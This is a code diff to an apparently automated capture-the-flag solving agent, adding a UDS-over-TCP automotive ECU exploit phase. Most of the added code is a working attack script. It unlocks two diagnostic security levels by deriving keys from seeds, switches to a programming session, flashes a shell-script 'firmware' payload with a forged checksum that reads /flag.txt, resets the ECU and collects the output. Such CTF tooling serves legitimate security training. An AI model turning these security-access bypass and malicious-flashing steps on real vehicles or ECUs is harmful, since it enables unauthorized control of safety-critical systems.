@@ -68,6 +68,8 @@ class PwnAgent(BaseAgent):
             "buffer_overflow",
             "rop_chain_generation",
             "shellcode_injection",
+            "uds_over_tcp",
+            "automotive_diagnostics",
             "format_string_exploitation",
             "heap_exploitation",
             "binary_mitigation_analysis",
@@ -111,6 +113,13 @@ class PwnAgent(BaseAgent):
         steps: List[str] = []
         files = challenge.get("files", [])
         binaries = [f for f in files if _is_binary(f)]
+
+        uds_steps, flag_str, handled = self._phase_uds_firmware_takeover(challenge)
+        steps.extend(uds_steps)
+        if flag_str:
+            return self._result(challenge, "solved", steps, flag=flag_str)
+        if handled and not binaries:
+            return self._result(challenge, "attempted", steps)
 
         if not binaries:
             conn_info = challenge.get("connection_info")
@@ -1044,6 +1053,157 @@ class PwnAgent(BaseAgent):
 
         return steps, None
 
+    def _phase_uds_firmware_takeover(
+        self, challenge: Dict[str, Any]
+    ) -> tuple[List[str], Optional[str], bool]:
+        steps: List[str] = []
+        if not self._looks_like_uds_challenge(challenge):
+            return steps, None, False
+
+        conn_info = self._extract_connection_info(challenge)
+        if not conn_info:
+            steps.append("UDS diagnostic playbook skipped; no remote host:port found.")
+            return steps, None, True
+
+        endpoint = self._checked_remote_endpoint(conn_info, steps, label="UDS diagnostic")
+        if endpoint is None:
+            return steps, None, True
+        host, port = endpoint
+
+        steps.append(f"Detected UDS-over-TCP ECU challenge at {host}:{port}.")
+        payload = self._build_flag_printing_firmware_payload()
+
+        try:
+            with socket.create_connection((host, port), timeout=8) as sock:
+                steps.append("Starting extended diagnostic session.")
+                resp = self._uds_request(sock, b"\x10\x03")
+                if not resp.startswith(b"\x50\x03"):
+                    steps.append(f"UDS session control returned {resp.hex() or 'no response'}.")
+                    return steps, None, True
+
+                if not self._uds_unlock_security(sock, steps):
+                    return steps, None, True
+
+                resp = self._uds_request(sock, b"\x10\x02")
+                if not resp.startswith(b"\x50\x02"):
+                    steps.append(f"Programming session request failed: {resp.hex() or 'no response'}.")
+                    return steps, None, True
+
+                size = len(payload)
+                resp = self._uds_request(sock, b"\x34\x00\x22\x40\x00" + size.to_bytes(2, "big"))
+                if not resp.startswith(b"\x74"):
+                    steps.append(f"RequestDownload failed: {resp.hex() or 'no response'}.")
+                    return steps, None, True
+
+                resp = self._uds_request(sock, b"\x36\x01" + payload)
+                if resp != b"\x76\x01":
+                    steps.append(f"TransferData failed: {resp.hex() or 'no response'}.")
+                    return steps, None, True
+
+                resp = self._uds_request(sock, b"\x37")
+                if resp != b"\x77":
+                    steps.append(f"TransferExit failed: {resp.hex() or 'no response'}.")
+                    return steps, None, True
+
+                resp = self._uds_request(sock, b"\x11\x01")
+                if resp != b"\x51\x01":
+                    steps.append(f"ECU reset did not accept the pending firmware: {resp.hex() or 'no response'}.")
+                    return steps, None, True
+
+                steps.append("Firmware accepted; keeping TCP stream open after reset.")
+                output = self._recv_raw_after_reset(sock)
+                preview = output[:200].decode("utf-8", errors="replace").replace("\n", " ")
+                if preview:
+                    steps.append(f"Firmware payload output: {preview!r}")
+                flag = find_first_flag(output.decode("utf-8", errors="replace"))
+                if flag:
+                    steps.append(f"Flag found via UDS firmware payload: {flag}")
+                    return steps, flag, True
+
+                steps.append("UDS firmware payload ran or timed out without a flag.")
+                return steps, None, True
+        except Exception as exc:
+            steps.append(f"UDS diagnostic exploit failed: {exc}")
+            return steps, None, True
+
+    @staticmethod
+    def _looks_like_uds_challenge(challenge: Dict[str, Any]) -> bool:
+        text = " ".join([
+            str(challenge.get("name", "")),
+            str(challenge.get("description", "")),
+            str(challenge.get("category", "")),
+        ]).lower()
+        return (
+            "uds" in text
+            or ("ecu" in text and "diagnostic" in text)
+            or ("ecu" in text and "0x4000" in text)
+        )
+
+    @staticmethod
+    def _build_flag_printing_firmware_payload() -> bytes:
+        payload = b"#!/bin/sh\ncat /flag.txt\n"
+        checksum = ((sum(payload) & 0xffff) ^ 0xbeef).to_bytes(2, "big")
+        return payload + checksum
+
+    @staticmethod
+    def _uds_request(sock: socket.socket, payload: bytes, timeout: float = 5.0) -> bytes:
+        sock.settimeout(timeout)
+        sock.sendall(len(payload).to_bytes(2, "big") + payload)
+        header = sock.recv(2)
+        if not header:
+            return b""
+        expected = int.from_bytes(header, "big")
+        data = bytearray()
+        while len(data) < expected:
+            chunk = sock.recv(expected - len(data))
+            if not chunk:
+                break
+            data.extend(chunk)
+        return bytes(data)
+
+    def _uds_unlock_security(self, sock: socket.socket, steps: List[str]) -> bool:
+        resp = self._uds_request(sock, b"\x27\x01")
+        if not resp.startswith(b"\x67\x01") or len(resp) < 4:
+            steps.append(f"SecurityAccess level 1 seed failed: {resp.hex() or 'no response'}.")
+            return False
+
+        seed = int.from_bytes(resp[2:4], "big")
+        resp = self._uds_request(sock, b"\x27\x02" + (seed ^ 0x1337).to_bytes(2, "big"))
+        if resp != b"\x67\x02":
+            steps.append(f"SecurityAccess level 1 key failed: {resp.hex() or 'no response'}.")
+            return False
+        steps.append("Unlocked UDS security level 1.")
+
+        resp = self._uds_request(sock, b"\x27\x03")
+        if not resp.startswith(b"\x67\x03") or len(resp) < 4:
+            steps.append(f"SecurityAccess level 2 seed failed: {resp.hex() or 'no response'}.")
+            return False
+
+        seed = int.from_bytes(resp[2:4], "big")
+        key = (((0x41C64E6D * seed + 0x3039) & 0xffffffff) >> 16).to_bytes(2, "big")
+        resp = self._uds_request(sock, b"\x27\x04" + key)
+        if resp != b"\x67\x04":
+            steps.append(f"SecurityAccess level 2 key failed: {resp.hex() or 'no response'}.")
+            return False
+        steps.append("Unlocked UDS security level 2.")
+        return True
+
+    @staticmethod
+    def _recv_raw_after_reset(sock: socket.socket, timeout: float = 4.0) -> bytes:
+        sock.settimeout(timeout)
+        output = bytearray()
+        while True:
+            try:
+                chunk = sock.recv(4096)
+            except socket.timeout:
+                break
+            if not chunk:
+                break
+            output.extend(chunk)
+            if find_first_flag(output.decode("utf-8", errors="replace")):
+                break
+        return bytes(output)
+
     def _extract_connection_info(self, challenge: Dict[str, Any]) -> Optional[str]:
         for key in ("connection_info", "remote", "target"):
             value = challenge.get(key)
@@ -1073,6 +1233,14 @@ class PwnAgent(BaseAgent):
             str(challenge.get("name", "")),
             str(challenge.get("description", "")),
         ])
+        match = re.search(
+            r"\b(?:nc|ncat|netcat)\s+([A-Za-z0-9_.-]+)\s+(\d{2,5})\b",
+            text,
+            re.I,
+        )
+        if match:
+            return f"{match.group(1)}:{int(match.group(2))}"
+
         match = re.search(r"\b((?:\d{1,3}\.){3}\d{1,3}|[A-Za-z0-9_.-]+)\s*:\s*(\d{2,5})\b", text)
         if match:
             return f"{match.group(1)}:{int(match.group(2))}"
